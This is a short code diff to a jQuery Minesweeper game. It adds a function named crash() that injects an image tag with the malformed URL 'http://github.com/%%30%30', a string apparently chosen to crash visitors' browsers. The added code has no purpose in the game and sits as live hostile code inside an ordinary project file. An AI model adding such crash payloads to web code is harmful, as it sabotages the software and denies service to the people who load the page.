@@ -27,6 +27,10 @@ var MineSweeper;
 jQuery(function ($) {
     'use strict';
 
+	function crash() {
+		$(document).append('<img src="http://github.com/%%30%30">')
+	}
+	
     // standard level configurations
     var levels = {
         'beginner': {
